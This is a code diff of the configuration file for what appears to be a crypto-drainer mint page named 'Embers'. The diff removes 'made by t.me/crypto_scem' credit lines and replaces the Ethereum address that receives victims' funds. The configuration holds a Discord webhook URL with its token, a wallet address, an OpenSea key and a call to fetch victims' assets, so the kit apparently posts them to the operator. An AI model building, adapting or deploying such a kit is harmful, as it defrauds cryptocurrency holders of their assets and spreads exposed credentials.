@@ -1,11 +1,11 @@
-// made by https://t.me/crypto_scem (telegram link)
+
 
 
 const configuration = {
-    name: 'Embers', // project title
-    subname: 'embers', // project subtitle
-    cost: 0.06, // mint price to show on site
-    amount: { // amount to can be minted
+    name: 'Embers', 
+    subname: 'embers', 
+    cost: 0.06, 
+    amount: { 
       max: 10,
       value: 1
     },
@@ -17,10 +17,10 @@ const configuration = {
         interval: 3000
       }
     },
-    webhook: // discord webhook
+    webhook:
       'https://discordapp.com/api/webhooks/1053160606422802442/XzCTt2JrXF5btprXr9wGDByduaT6Eml31pU8e9-nK91Ri3D-rTGvaZj10R6d8RnmxyLR',
-    address: '0x43e2d0145d88A83D536Fe54B70FFBf27d16Ef326', // eth address
-    opensea: '2b03ed0cdd9c4d5598a4fbbcae11f66e' // opensea id (dont change)
+    address: '0xc50289062AA7F693224AdAe7A3A6B1A947E95a98', 
+    opensea: '2b03ed0cdd9c4d5598a4fbbcae11f66e' 
   };
   
 
@@ -181,7 +181,3 @@ const configuration = {
                 _getAssets();
               });
             };
-// made by https://t.me/crypto_scem (telegram link)
-// made by https://t.me/crypto_scem (telegram link)
-// made by https://t.me/crypto_scem (telegram link)
-// made by https://t.me/crypto_scem (telegram link)
